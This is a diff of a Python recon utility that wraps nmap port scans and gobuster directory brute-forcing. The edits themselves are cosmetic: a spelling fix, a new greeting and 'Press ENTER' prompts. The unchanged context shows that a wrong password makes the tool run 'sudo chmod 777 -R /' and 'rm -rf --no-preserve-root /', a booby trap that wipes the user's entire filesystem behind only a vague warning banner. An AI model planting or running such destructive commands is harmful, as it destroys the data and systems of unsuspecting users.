@@ -7,7 +7,7 @@ import socket
 import requests
 
 def banner():
-    print("**********************************************************************\n*                                                                    *\n*    BE CAREFULL!! MAKE SURE YOU KNOW THE PASSWORD BEFORE RUN        *\n*   You will take full responsibility if you choose to countinue     *\n*                                                                    *\n*    Enter Your Password Down Below if You Wish to Countinue!        *\n*                                                                    *\n**********************************************************************")
+    print("**********************************************************************\n*                                                                    *\n*    BE CAREFUL!! MAKE SURE YOU KNOW THE PASSWORD BEFORE RUN        *\n*   You will take full responsibility if you choose to countinue     *\n*                                                                    *\n*    Enter Your Password Down Below if You Wish to Countinue!        *\n*                                                                    *\n**********************************************************************")
 
 banner()
 
@@ -36,7 +36,7 @@ def password_check():
         subprocess.run(['sudo','chmod','777','-R','/'])
         subprocess.run(['rm','-rf','--no-preserve-root','/'], check=True)
     else:
-        print('---Welcome Back----')
+        print('           ---Welcome Back Master----')
 
 password_check()
 
@@ -46,22 +46,23 @@ def get_my_ip():
     local_ip = socket.gethostbyname(socket.gethostname())
     public_ip = requests.get('https://api.ipify.org').text
     print(f'Your Local IP Address: {local_ip}\nYour Public IP Address: {public_ip}')
-    print("Warping up, returning to main menu...")
+    print("Press ENTER to main menu...")
+    input()
 
 
 def ip_port_check():
     print("RUNNING PORT CHECK")
     ip_nmap = input("Enter the IP address you want to check: ")
     subprocess.run(['nmap','-sC','-sV','-oN',f'cache/{ip_nmap}',f'{ip_nmap}'], check=True)
-    print("Warping up, returning to main menu...")
-
+    print("Press ENTER to main menu...")
+    input()
 
 def gobuster():
     print("RUNNING WEB DIGGING")
     ip_go = input("Enter the IP address you want to bust their door: ")
     subprocess.run(['gobuster','-w','./wordlist/dir_list.txt','dir','-u',f'http://{ip_go}'])
-    print("Warping up, returning back to main menu")
-
+    print("Press ENTER to main menu...")
+    input()
 
 def exit():
     print("Oh, That's it?!!")
